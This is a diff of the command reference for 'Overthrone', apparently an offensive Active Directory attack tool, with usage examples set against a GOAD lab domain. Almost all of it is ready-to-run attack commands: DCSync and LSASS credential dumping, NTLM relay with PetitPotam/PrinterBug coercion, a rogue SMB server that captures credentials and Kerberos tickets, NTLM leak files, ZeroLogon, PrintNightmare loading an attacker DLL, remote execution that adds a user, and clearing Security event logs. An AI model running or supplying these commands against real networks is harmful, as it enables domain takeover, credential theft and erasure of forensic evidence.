@@ -1,4 +1,4 @@
-# Overthrone v0.4.9 — Complete Command Reference
+# Overthrone v0.5.0 - Complete Command Reference
 
 > Real usage examples for every command across all 9 crates.
 > Tested against GOAD-Light (WS2019 DCs) — `sevenkingdoms.local` (192.168.57.10)
@@ -17,6 +17,7 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 ### 🔍 Phase 1: Recon & Enumeration
 - [Core Enumeration (`ovt enum`)](#core-enumeration-ovt-enum)
 - [LDAP Client (`ovt ldap`)](#ldap-client-ovt-ldap)
+- [ADWS / WS-Trust Client (`ovt adws`)](#adws--ws-trust-client-ovt-adws)
 - [RPC Client (`ovt rpc`)](#rpc-client-ovt-rpc)
 - [Scan (`ovt scan`)](#scan-ovt-scan)
 - [Reaper Assessment (`ovt reaper`)](#reaper-assessment-ovt-reaper)
@@ -47,12 +48,15 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 
 ### 👑 Phase 4: Privilege Escalation & Persistence
 - [ADCS Exploitation (`ovt adcs`)](#adcs-exploitation-ovt-adcs)
+- [ZeroLogon (`ovt zerologon`)](#zerologon-ovt-zerologon)
+- [PrintNightmare (`ovt printnightmare`)](#printnightmare-ovt-printnightmare)
 - [Forge Ticket Forging (`ovt forge`)](#forge-ticket-forging-ovt-forge)
 - [Shadow Credentials (`ovt shadow`)](#shadow-credentials-ovt-shadow)
 - [DCShadow Rogue DC Push (`ovt dcshadow`)](#dcshadow-rogue-dc-push-ovt-dcshadow)
 - [Local Credential Dumpers (`ovt local-creds`)](#local-credential-dumpers-ovt-local-creds)
 - [Sherlock Vuln Enumeration (`ovt sherlock`)](#sherlock-vuln-enumeration-ovt-sherlock)
 - [LSASS Dump (`ovt dump-lsass`)](#lsass-dump-ovt-dump-lsass)
+- [Event Log Operations (`ovt events`)](#event-log-operations-ovt-events)
 - [Credential Guard Check (`ovt cg`)](#credential-guard-check-ovt-cg)
 - [EDR Assessment & Evasion (`ovt edr`)](#edr-assessment--evasion-ovt-edr)
 - [Wi-Fi Credential Extraction (`ovt wifi`)](#wi-fi-credential-extraction-ovt-wifi)
@@ -83,6 +87,7 @@ Every command works as both `overthrone <cmd>` and `ovt <cmd>`. We use `ovt` bec
 - [CVE Exploit Quick Reference](#cve-exploit-quick-reference)
 - [Quick Reference Card](#quick-reference-card)
 - [VulnAD Quick-Start](#vulnad-quick-start)
+- [Scenario Playbook (`ovt playbook`)](#scenario-playbook-ovt-playbook)
 
 ---
 
@@ -242,6 +247,40 @@ ovt ldap rootdse -t 192.168.57.10 --ldaps
 | `enum-computers` | `-t` (required), `--ldaps` | Enumerate domain computers |
 | `enum-groups` | `-t` (required), `--ldaps` | Enumerate domain groups |
 | `enum-trusts` | `-t` (required), `--ldaps` | Enumerate domain trusts |
+
+---
+
+## ADWS / WS-Trust Client (`ovt adws`)
+
+Active Directory Web Services enumeration over TCP 9389 using WS-Trust
+(NTLM BinaryExchange). Works where plain LDAP is hardened: signed-bind
+enforcement, LDAPS-only policies, and ADWS-port-only ACLs still leave 9389
+open for software-installed endpoints with NTLM auth (Impacket
+`soaphound`/ADWS parity).
+
+```bash
+# Enumerate users over ADWS (default filter (&(objectClass=user)))
+ovt adws enum -t kingslanding.sevenkingdoms.local -D sevenkingdoms.local --username vagrant --hash a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+
+# Enumerate computers
+ovt adws search -t kingslanding.sevenkingdoms.local -D sevenkingdoms.local --username vagrant --hash <32hex> --filter "(objectClass=computer)"
+
+# Arbitrary ldap-style filter, JSON out (jq-friendly), custom page size
+ovt adws search -t <dc> -D <domain> --username <user> --hash <32hex> --filter "(&(sAMAccountType=805306368)(adminCount=1))" --max-elements 500 --json
+```
+
+| Flag | Default | What it does |
+|---|---|---|
+| `-t, --dc` | required | DC hostname/IP (ADWS on TCP 9389) |
+| `-D, --domain` | required | NetBIOS/FQDN domain |
+| `--username` | required | Username |
+| `--hash` | required | NT hash (32-hex, or LM:NT form) |
+| `-f, --filter` | `(objectClass=user)` / `(objectClass=*)` | LDAP-style filter for wsen:Filter |
+| `--max-elements` | 100 | Elements per Pull page |
+| `--json` | off | Emit JSON instead of a rendered table |
+
+Aliases: `ovt adws` ⇄ `ovt wsman` (top-level alias). Playbook cross-ref:
+`ovt adws enum` doubles as the hardened-DC step in the `recon` recipe.
 
 ---
 
@@ -412,37 +451,34 @@ ovt guid list --filter replication
 
 ```bash
 # DCSync a single user's hash
-ovt dump 192.168.57.10 ntds --user vagrant -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 ntds --user vagrant -d sevenkingdoms.local -u vagrant -p vagrant
 
-# DCSync all NTDS hashes (requires DRSUAPI access)
-ovt dump 192.168.57.10 dcsync -d sevenkingdoms.local -u vagrant -p vagrant
+# DCSync all NTDS hashes (requires DRSUAPI access; `dcsync` is an alias of `ntds`)
+ovt dump -t 192.168.57.10 dcsync -d sevenkingdoms.local -u vagrant -p vagrant
 
 # NTDS.dit via VSS shadow copy + SMB @GMT read (bypasses WS2025 file-write sandbox)
 # Creates a Volume Shadow Copy, reads NTDS.dit + SYSTEM directly via @GMT- path
-ovt dump 192.168.57.10 ntds-vss -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 ntds-vss -d sevenkingdoms.local -u vagrant -p vagrant
 
 # LSASS dump via comsvcs.dll MiniDump (cross-platform minidump parsing)
 # Dumps LSASS memory via SMBExec + comsvcs.dll, downloads minidump, parses in Rust
 # Supports --user/--nt-hash/--kerberos for auth; extracts NTLM hashes + AES-256 keys
-ovt dump 192.168.57.10 lsass -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 lsass -d sevenkingdoms.local -u vagrant -p vagrant
 
 # SAM registry hive dump (requires local admin)
-ovt dump 192.168.57.10 sam -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 sam -d sevenkingdoms.local -u vagrant -p vagrant
 
 # LSA secrets dump
-ovt dump 192.168.57.10 lsa -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 lsa -d sevenkingdoms.local -u vagrant -p vagrant
 
 # DCC2 cached credentials dump
-ovt dump 192.168.57.10 dcc2 -d sevenkingdoms.local -u vagrant -p vagrant
-
-# Full dump (all available methods)
-ovt dump 192.168.57.10 all -d sevenkingdoms.local -u vagrant -p vagrant
+ovt dump -t 192.168.57.10 dcc2 -d sevenkingdoms.local -u vagrant -p vagrant
 ```
 
 | Flag | Default | What it does |
 |---|---|---|
 | `--target`, `-t` | required | Target host |
-| `source` | (positional, required) | `sam`, `lsa`, `ntds`, `dcc2`, `lsass`, `ntds-vss`, `all` |
+| `source` | (positional, required) | `sam`, `lsa`, `ntds` (alias `dcsync`), `ntds-vss`, `dcc2`, `lsass` |
 
 **LSASS dump flow:** The `lsass` source uses SMBExec to run `rundll32.exe comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full` on the target, then downloads the dump file via SMB and parses it with the built-in cross-platform minidump parser. The parser extracts NTLM hashes (NT hash, LM hash), AES-256 session keys, and usernames from the minidump memory regions. If the direct download fails (WS2025 sandbox), it falls back to creating the dump via MS-EVEN RPC (`ElfrClearLogFileW`).
 
@@ -475,6 +511,11 @@ ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local --use-ldap
 ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local \
   --userlist /usr/share/seclists/Usernames/Names/names.txt \
   --concurrency 20 --delay 100
+
+# Describe a captured ticket (Kirbi / ccache / raw application ticket)
+ovt kerberos describe --file vagrant.kirbi
+# JSON output for tooling (respects the global --output-format)
+ovt kerberos describe --file vagrant.kirbi --output-format json
 ```
 
 | Subcommand | Flags | What it does |
@@ -484,6 +525,27 @@ ovt kerberos user-enum -H 192.168.57.10 -d sevenkingdoms.local \
 | `user-enum` | `--userlist`, `--output`, `--delay`, `--concurrency`, `--use-ldap` | Zero-knowledge username enumeration (auto-discovers SecLists username wordlists) |
 | `get-tgt` | | Request a TGT |
 | `get-tgs` | `--spn` (required), `--impersonate` (optional), `--altservice` (optional) | Request TGS, or perform S4U impersonation with `--impersonate` |
+| `describe` | `--file` (required) | Parse KIRBI/ccache/raw tickets: realm, sname, etypes, kvno, auth/start/end/renew times, validity status, TGT detection |
+
+### Standalone Ticket Description (`ovt ticket`)
+
+Alias: `ovt ticket` == describe a ticket file without any credentials or
+network access. Same output as `ovt kerberos describe`, plus an explicit
+`--format json|human` override independent of the global `--output-format`:
+
+```bash
+# Human-readable (default)
+ovt ticket --ticket vagrant.kirbi
+
+# JSON (for grep/python pipelines)
+ovt ticket --ticket vagrant@CORP.LOCAL.ccache --format json
+ovt ticket -t raw_apreq.bin --format human
+```
+
+| Flag | Values | What it does |
+|---|---|---|
+| `--ticket`/`-t` | path (required) | Kirbi, ccache, or raw AP-REQ/AP-REP bytes |
+| `--format` | `human` (default), `json` | Output format override |
 
 ---
 
@@ -747,6 +809,36 @@ ovt dump-lsass -d sevenkingdoms.local -u vagrant -p vagrant --no-etw-suppress
 
 ---
 
+## Event Log Operations (`ovt events`)
+
+Alias: `ovt eventlog`.
+
+Windows event log hygiene via the MS-EVEN RPC primitives
+(`ElfrClearLogFileW` / `ElfrBackupEventLogW`, over the `\pipe\eventlog`):
+
+```bash
+# Clear (truncate) the System log on a target host
+ovt events clear --target 192.168.57.10 --log-name System
+
+# Clear Security (default log is System)
+ovt events clear --target 192.168.57.10 --log-name Security
+
+# Custom target path (overrides --log-name)
+ovt events clear --target 192.168.57.10 --path "C:\Windows\System32\Winevt\Logs\Security.evtx"
+
+# Back up a log to an attacker-chosen path on the remote host (rarely blocked,
+# and keeps an evidence copy for the report)
+ovt events backup --target 192.168.57.10 --log-name Security `
+    --path "C:\Windows\Temp\security_backup.evtx"
+```
+
+| Subcommand | Flags | What it does |
+|---|---|---|
+| `clear` | `--target` (required), `--log-name` (default: `System`), `--path` (optional override) | Truncate an event log as SYSTEM via MS-EVEN |
+| `backup` | `--target` (required), `--log-name` (default: `System`), `--path` (required) | Copy an event log to a remote path via MS-EVEN |
+
+---
+
 ## Credential Guard Check (`ovt cg`)
 
 Check Credential Guard status on a target host.
@@ -795,33 +887,51 @@ ovt wifi -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
 Alias: `ovt relay`.
 
 ```bash
-# Classic NTLM relay (HTTP -> SMB)
-ovt ntlm relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "smb://192.168.57.10" --port 8080 --interface 0.0.0.0
+# Generic relay to any target URI (smb/http/https/ldap/ldaps/mssql/msmq/smtp/imap)
+ovt ntlm relay --targets "smb://192.168.57.10" --port 8080
 
 # SMB relay (SMB -> SMB)
-ovt ntlm smb-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "smb://192.168.57.10" --port 8445 --interface 0.0.0.0
+ovt ntlm smb-relay --targets "smb://192.168.57.10" --port 8445
 
 # HTTP relay (HTTP -> HTTP, e.g., Exchange)
-ovt ntlm http-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "https://mail.corp.local/ews/exchange.asmx" --port 8080
+ovt ntlm http-relay --targets "https://mail.corp.local/ews/exchange.asmx" --port 8080
 
-# LDAP relay (HTTP -> LDAP)
-ovt ntlm ldap-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "ldap://192.168.57.10" --port 8080
+# LDAP relay with GSS-SPNEGO (host form, --port defaults to 389)
+ovt ntlm ldap-relay --target 192.168.57.10 --port 389
 
 # HTTP->SMB asymmetric relay (capture HTTP, replay to SMB)
-ovt ntlm http-asymmetric -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --targets "http://192.168.57.10/certsrv/","smb://192.168.57.10" --port 8080
+ovt ntlm http-asymmetric --targets "http://192.168.57.10/certsrv/","smb://192.168.57.10" --port 8080
 
-# ADCS relay (NTLM relay to certsrv endpoint)
-ovt ntlm adcs-relay -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "http://192.168.57.10/certsrv/" --port 8080 --cert-template "User"
+# ADCS relay: generic HTTP relay pointed at the certsrv endpoint
+# (coerce the DC machine auth onto it for the ESC8 outcome)
+ovt ntlm relay --targets "http://192.168.57.10/certsrv/" --port 8080 `
+    --auto-coerce-targets "kingslanding.sevenkingdoms.local"
 
 # Capture NTLM hashes (Responder-style)
 ovt ntlm capture --interface eth0
 ovt ntlm capture --interface eth0 --no-poison
+
+# SMB capture daemon (rogue SMB2 server: fingerprints, NTLMv1/v2 capture)
+ovt ntlm smb-daemon --interface 0.0.0.0 --port 445
+
+# impacket smbserver.py parity: serve a local dir as an SMB share
+# while still capturing credentials on every session setup
+ovt ntlm smb-daemon --share-root ./payloads --share-name payloads
+
+# krbrelayx parity: capture Kerberos AP-REQs from PKU2U/SMB3 session setups
+# and write .kirbi files (usable with pass-the-ticket)
+ovt ntlm smb-daemon --krb5-capture --ticket-dir ./krb_tickets
+
+# With the krbtgt AES256/RC4 key (hex): tickets are decrypted inline and the
+# resulting .krbi files carry the real session key -- directly ptt-able
+ovt ntlm smb-daemon --krb5-capture --ticket-dir ./krb_tickets `
+    --krb-key 64c2a0f2a8c30ba2b19be83a5d5561c7e48ba2ea45bd4856cf1e42b19d98a2c1
+
+# krbrelayx --relay parity: forward the captured AP-REQs at a target
+# (implies --krb5-capture; plain Kerberos auth, no NTLM challenge involved)
+ovt ntlm smb-daemon --krb-relay "ldap://192.168.57.10:389"
+ovt ntlm smb-daemon --krb-relay "ldaps://192.168.57.10:636"
+ovt ntlm smb-daemon --krb-relay "http://192.168.57.10:80/certsrv/"
 
 # Poisoner (LLMNR/NBT-NS/mDNS spoofing)
 ovt ntlm poison --interface eth0
@@ -829,53 +939,159 @@ ovt ntlm poison --interface eth0
 # Responder (HTTP/SMB/MySQL/FTP/LDAP rogue servers)
 ovt ntlm respond --interface eth0
 
-# Coercion triggers
+# Coercion -- the trigger techniques (PrinterBug MS-RPRN / PetitPotam MS-EFSRPC /
+# DFSCoerce MS-DFSNM / ShadowCoerce MS-FSRVP) are built into the relay commands:
+# the controller raises the listener, then fires the coercion at every host in
+# --auto-coerce-targets with the UNC pointed at your listener IP.
 
-# Printer Bug (MS-RPRN) -- unauthenticated
-ovt ntlm trigger-printer-bug -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "192.168.57.22" --capture-ip "192.168.57.5"
+# LDAP relay with authenticated auto-coercion (one command does listener + triggers)
+ovt ntlm ldap-relay --target 192.168.57.10 --port 8080 `
+    --auto-coerce-targets 192.168.57.22 --auto-coerce-domain sevenkingdoms.local `
+    --auto-coerce-user vagrant --auto-coerce-password vagrant
 
-# Printer Bug -- with authenticated SMB
-ovt ntlm trigger-printer-bug -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "192.168.57.22" --capture-ip "192.168.57.5" --coerce-domain sevenkingdoms.local --coerce-user vagrant --coerce-password vagrant
+# Generic relay to SMB with null-session (lazy) auto-coercion
+ovt ntlm relay --targets "smb://192.168.57.10" --port 8080 --auto-coerce-targets 192.168.57.22
 
-# PetitPotam (MS-EFSRPC) -- unauthenticated
-ovt ntlm trigger-petitpotam -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "192.168.57.22" --capture-ip "192.168.57.5"
-
-# PetitPotam -- with authenticated SMB
-ovt ntlm trigger-petitpotam -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "192.168.57.22" --capture-ip "192.168.57.5" --coerce-domain sevenkingdoms.local --coerce-user vagrant --coerce-password vagrant
-
-# DFS Coercion (MS-DFSNM)
-ovt ntlm trigger-dfs -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "192.168.57.22" --capture-ip "192.168.57.5"
-
-# Exchange relay via NTLM
+# Exchange relay via NTLM (CVE-2024-21410) -- bare host, TLS by default on 443
 ovt ntlm exchange -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
-    --target "https://mail.corp.local/ews/exchange.asmx" --port 8080
+    --target mail.corp.local --port 443
+
+# ...or plain HTTP (add --no-tls), custom EWS path if != /EWS/Exchange.asmx
+ovt ntlm exchange -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant `
+    --target mail.corp.local --port 80 --no-tls --ews-path "/ews/exchange.asmx"
+
+# SMTP relay target (ntlmrelayx parity -- SASL AUTH NTLM step conversation)
+ovt ntlm relay --targets "smtp://192.168.57.22" --port 8080
+
+# IMAP relay target (RFC 3501 AUTHENTICATE NTLM -- CAPABILITY + tagged replies)
+ovt ntlm relay --targets "imap://192.168.57.22" --port 8080
+
+# Post-auth tour: after the relay completes a session, run a command through it
+# (SMB targets: exec via relayed session; MSSQL: post-auth command tour)
+ovt ntlm smb-relay --targets "smb://192.168.57.10" --port 8445 `
+    --command "whoami /priv"
 
 # All relay options:
 #   --socks5-proxy <PROXY>          Route through SOCKS5 proxy
 #   --tls-verify                    Validate server TLS cert
 #   --auto-coerce-domain/user/pass  Auto-trigger coercion before relay
+#
+# Target URI prefixes (default port per scheme):
+#   smb://(:445) http://(:80) https://(:443) ldap://(:389) ldaps://(:636)
+#   mssql://(:1433) msmq://(:1801) smtp://(:587) imap://(:143) exchange://
 ```
 
 | Subcommand | Flags | What it does |
 |---|---|---|
 | `capture` | `--interface`/`-i` (default: `0.0.0.0`), `--port`/`-P` (default: `445`), `--no-poison` | Capture NTLM hashes |
-| `relay` | `--targets`/`-t` (required, comma-separated), `--port`/`-P` (default: `445`), `--command`/`-c`, `--no-poison` | Relay to targets |
-| `smb-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `445`), `--command`/`-c` | SMB relay with signing bypass |
-| `http-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `80`), `--command`/`-c` | HTTP/HTTPS relay |
-| `ldap-relay` | `--target` (required), `--port` (default: `8080`) | LDAP relay |
-| `http-asymmetric` | `--targets` (required), `--port` (default: `8080`) | HTTP->SMB asymmetric relay |
-| `adcs-relay` | `--target` (required), `--port` (default: `8080`), `--cert-template` | ADCS NTLM relay |
+| `smb-daemon` | `--interface`/`-i`, `--port`/`-P` (default: `445`), `--challenge` (8-byte hex), `--share-root` + `--share-name` (smbserver.py mode), `--hash-format summary\|hashcat\|john`, `--output-file`/`-o`, `--krb5-capture` + `--ticket-dir` + `--krb-key` (krbrelayx capture), `--krb-relay ldap://DC:389` (krbrelayx --relay: forward AP-REQs to LDAP/HTTP target) | Rogue SMB2 server: NTLM capture, hosted file share, Kerberos AP-REQ capture to pass-the-ticket `.kirbi` |
+| `relay` | `--targets`/`-t` (required, comma-separated), `--port`/`-P` (default: `0`), `--command`/`-c` (post-auth SMB exec), `--no-poison`, `--auto-coerce-targets` + `--auto-coerce-domain/user/password` | Relay to targets |
+| `smb-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `445`), `--command`/`-c`, `--auto-coerce-*` | SMB relay with signing bypass |
+| `http-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `80`), `--command`/`-c`, `--auto-coerce-*` | HTTP/HTTPS relay |
+| `ldap-relay` | `--target` (host, required), `--port` (default: `389`), `--ldaps`, `--no-signing-bypass`, `--auto-coerce-*` | LDAP relay |
+| `http-asymmetric` | `--targets` (required, `http://`+`smb://` mix), `--port`/`-P` (default: `80`), `--interface`/`-i`, `--socks5-proxy` | HTTP capture -> SMB replay asymmetric relay |
+| `tls-relay` | `--targets`/`-t` (required), `--port`/`-P` (default: `443`), `--interface`/`-i`, `--tls-cert` + `--tls-key` (required), `--mtls-client-ca`, `--cbt-mode strip\|passthrough\|validate` | TLS-wrapped relay with mTLS identity + CBT handling |
 | `poison` | `--interface`/`-i` (default: `0.0.0.0`) | LLMNR/NBT-NS/mDNS spoofing |
 | `respond` | `--interface`/`-i` (default: `0.0.0.0`) | Rogue protocol servers |
-| `trigger-printer-bug` | `--target`, `--capture-ip`, `--coerce-domain/user/password` (optional) | MS-RPRN coercion |
-| `trigger-petitpotam` | `--target`, `--capture-ip`, `--coerce-domain/user/password` (optional) | MS-EFSRPC coercion |
-| `trigger-dfs` | `--target`, `--capture-ip` | MS-DFSNM coercion |
-| `exchange` | `--target`, `--port` (default: `8080`) | Exchange NTLM relay |
+| `exchange` | `--target`/`-t` (host, required), `--port` (default: `443`), `--no-tls`, `--ews-path`, `--mapi-path`, `--version` (2013\|2016), TLS `--tls-client-cert/--tls-client-key/--tls-verify`, `--socks5-proxy` | Exchange (EWS) NTLM relay (CVE-2024-21410) |
+| `captive-portal` | `--interface`, `--port`/`-P`, `--template` | Rogue captive portal credential harvester |
+| `leak` | `--unc` (required, e.g. `\\10.0.0.1\leak`), `--output-dir`/`-o`, `--formats`/`-f`, `--bundle` | NTLM credential leak artifact generator (CVE-2025-24054/24071, CVE-2024-43451) |
+
+> Coercion triggers (PrinterBug MS-RPRN, PetitPotam MS-EFSRPC, DFSCoerce
+> MS-DFSNM, ShadowCoerce MS-FSRVP) run *inside* the relay controller via
+> `--auto-coerce-targets <hosts>` (+ optional authenticated
+> `--auto-coerce-domain/user/password`); there are no separate `ovt ntlm
+> trigger-*` subcommands.
+
+
+### NTLM Leak Generator (`ovt ntlm leak`)
+
+Generates targeted files that force Explorer to authenticate to an attacker
+share when opened/previewed (NTLM leakage, no macros needed):
+
+```bash
+# Base64 bundle of every format (paste into an HTML reporter / save manually)
+ovt ntlm leak --unc \\10.0.0.1\leak --bundle
+
+# Write all artifacts to a folder
+ovt ntlm leak --unc \\10.0.0.1\leak --output-dir ./out
+
+# Only the .library-ms (CVE-2025-24054) and .lnk formats
+ovt ntlm leak --unc 10.0.0.1\leak -f library-ms -f lnk
+
+# Shared formats for the -f flag:
+#   library-ms, searchconnector-ms, url, website, scf, lnk
+```
+
+| Format | CVE | Trigger |
+|---|---|---|
+| `library-ms` | CVE-2025-24054 / 24071 | Explorer preview/save |
+| `searchconnector-ms` | CVE-2025-24054 | Explorer preview |
+| `url` | CVE-2024-43451 | Icon path resolution |
+| `website` | CVE-2024-43451 | Icon path resolution |
+| `scf` | (classic) | Explorer folder view refresh |
+| `lnk` | best-effort (MS-SHLLINK) | Icon path resolution |
+
+---
+
+## ZeroLogon (`ovt zerologon`)
+
+Netlogon empty-password auth bypass (CVE-2020-1472). `check`/`probe` are safe;
+`exploit` is destructive and gated behind `--force`.
+
+```bash
+# Deterministic check -- authenticate with an EMPTY machine password
+ovt zerologon check -t 192.168.57.10
+
+# Non-destructive 1/256 probe (works even when the machine password is set)
+ovt zerologon probe -t 192.168.57.10
+
+# Full exploit (DESTRUCTIVE: machine account password -> empty)
+# requires --force, then IMMEDIATELY DCSync and restore the password
+ovt zerologon exploit -t 192.168.57.10 --force
+ovt dump -t 192.168.57.10 source ntds -d sevenkingdoms.local \
+    --user "DC01$" -w <empty-password>
+# Restore: reset the DC machine password with the original NT hash
+```
+
+| Subcommand | Flags | What it does |
+|---|---|---|
+| `check` | `--target`/`-t` (required), `--computer-name` | Empty-password Authenticate3 (single attempt) |
+| `probe` | `--target`/`-t`, `--computer-name`, `--max-attempts` (default `2000`) | 1/256 auth-bypass brute force (noisy, non-destructive) |
+| `exploit` | `--target`/`-t`, `--computer-name`, `--max-attempts`, `--force` | Auth bypass + `NetrServerPasswordSet2` (empty password) |
+
+---
+
+## PrintNightmare (`ovt printnightmare`)
+
+Spooler RCE via `RpcAddPrinterDriverEx` (CVE-2021-1675 / CVE-2021-34527).
+Runs over `\pipe\spoolss`; works unauthenticated or with `--username/--password/--domain`.
+
+```bash
+# Classify the spooler (invalid driver -> parse status 0x57 = vulnerable)
+ovt printnightmare check -t 192.168.57.22
+
+# RCE: spooler loads an attacker UNC path as SYSTEM
+# host the DLL content on a readable SMB share first
+ovt printnightmare exploit -t 192.168.57.22 \
+    --dll \\10.0.0.1\share\evil.dll --driver-name PN_RCE
+
+# Enumerate installed drivers (DRIVER_INFO_2)
+ovt printnightmare list -t 192.168.57.22
+
+# Cleanup
+ovt printnightmare delete -t 192.168.57.22 --driver-name PN_RCE
+```
+
+| Subcommand | Flags | What it does |
+|---|---|---|
+| `check` | `--target`/`-t` (required) | Status classification (`0x57` vulnerable / `0x8001011B`+ patched) |
+| `exploit` | `--target`/`-t`, `--dll` (required), `--driver-name` (default `PN_RCE`) | RpcAddPrinterDriverEx opnum 89, flags `0x8014` |
+| `delete` | `--target`/`-t`, `--driver-name` | RpcDeletePrinterDriverEx opnum 84 |
+| `list` | `--target`/`-t` | RpcEnumPrinterDrivers opnum 10 (round 1 + round 2) |
+
+NOTE: Print Spooler is OFF by default on stock Windows Server 2025; the tool
+reports an inaccessible pipe in that case.
 
 ---
 
@@ -989,14 +1205,14 @@ ovt graph gui --file attack_graph.json
 ovt graph gui -i ./graphs/
 ovt graph gui -i ./graphs/ --port 8080
 
-# Find shortest path between two nodes
-ovt graph path --from vagrant --to "Domain Admins"
+# Find shortest path between two nodes (from/to are positional)
+ovt graph path vagrant "Domain Admins"
 
 # Find ALL paths to Domain Admins from a user
-ovt graph path-to-da --from vagrant
+ovt graph path-to-da vagrant
 
-# Graph stats
-ovt graph stats
+# Graph stats (over a saved graph)
+ovt graph stats --file attack_graph.json
 
 # Export (JSON or BloodHound format)
 ovt graph export --output graph.json
@@ -1113,30 +1329,27 @@ Aliases: `ovt lateral`.
 ovt move smb ls -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --share "C$"
 
 # Upload file
-ovt move smb put -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant ./payload.exe "C$\Windows\Temp\payload.exe"
+ovt smb put -t 192.168.57.10 -l ./payload.exe -r "C$/Windows/Temp/payload.exe" -d sevenkingdoms.local -u vagrant -p vagrant
 
 # Download file
-ovt move smb get -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant "C$\Windows\Temp\payload.exe" ./downloaded.exe
+ovt smb get -t 192.168.57.10 --path "C$/Windows/Temp/payload.exe" -d sevenkingdoms.local -u vagrant -p vagrant
 
 # Remote execution
 
 # SMBExec (service creation via SCM)
-ovt move smbexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"
+ovt exec -t 192.168.57.10 --command "whoami" -d sevenkingdoms.local -u vagrant -p vagrant --method smbexec
 
 # WMIExec (WMI + SCM fallback)
-ovt move wmiexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "ipconfig"
+ovt exec -t 192.168.57.10 --command "ipconfig" -d sevenkingdoms.local -u vagrant -p vagrant --method wmiexec
 
 # PsExec style execution
-ovt move psexec -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "net user added_user Pass123! /add"
+ovt exec -t 192.168.57.10 --command "net user added_user Pass123! /add" -d sevenkingdoms.local -u vagrant -p vagrant --method psexec
 
 # WinRM execution (cross-platform)
-ovt move winrm -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --command "whoami"
+ovt exec -t 192.168.57.10 --command "whoami" -d sevenkingdoms.local -u vagrant -p vagrant --method winrm
 
-# RID cycling (enumerate domain accounts via SAMR)
-ovt move rid-cycle -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --max-rid 5000
-
-# ACL operations
-ovt move acl -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
+# RID cycling (enumerate domain accounts via SAMR; top-level command + aliases rid-cycle/rid-brute)
+ovt rid -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant --end-rid 5000
 
 # Trust operations
 ovt move trusts -H 192.168.57.10 -d sevenkingdoms.local -u vagrant -p vagrant
@@ -1395,25 +1608,25 @@ Aliases: `ovt sql`.
 ovt mssql query --target 192.168.57.100 --query "SELECT @@version" -d sevenkingdoms.local -u sa -p 'sa'
 
 # Execute OS command via xp_cmdshell
-ovt mssql xp-cmdshell --target 192.168.57.100 --command "whoami"
+ovt mssql xp-cmd-shell --target 192.168.57.100 --command "whoami"
 
 # Enumerate linked servers
 ovt mssql linked-servers --target 192.168.57.100
 
 # Enable xp_cmdshell
-ovt mssql enable-xp-cmdshell --target 192.168.57.100
+ovt mssql enable-xp-cmd-shell --target 192.168.57.100
 
 # Check if xp_cmdshell is enabled
-ovt mssql check-xp-cmdshell --target 192.168.57.100
+ovt mssql check-xp-cmd-shell --target 192.168.57.100
 ```
 
 | Subcommand | Flags | What it does |
 |---|---|---|
 | `query` | `--target`/`-t` (required), `--query`/`-q` (required), `--database`/`-D` (default: `master`) | Execute SQL query |
-| `xp-cmdshell` | `--target`/`-t` (required), `--command`/`-c` (required) | OS command via xp_cmdshell |
+| `xp-cmd-shell` | `--target`/`-t` (required), `--command`/`-c` (required) | OS command via xp_cmdshell |
 | `linked-servers` | `--target`/`-t` (required) | Enumerate linked servers |
-| `enable-xp-cmdshell` | `--target`/`-t` (required) | Enable xp_cmdshell |
-| `check-xp-cmdshell` | `--target`/`-t` (required) | Check xp_cmdshell status |
+| `enable-xp-cmd-shell` | `--target`/`-t` (required) | Enable xp_cmdshell |
+| `check-xp-cmd-shell` | `--target`/`-t` (required) | Check xp_cmdshell status |
 
 ---
 
@@ -1528,7 +1741,8 @@ ovt crack --hash-file ./kerberoast_hashes.txt --wordlist rockyou.txt --outfile c
 
 ## Offline Secrets (`ovt secrets`)
 
-Parse registry hive files offline (SAM, SECURITY, SYSTEM).
+Parse registry hive files offline (SAM, SECURITY, SYSTEM) and stolen
+NTDS.dit databases.
 
 ```bash
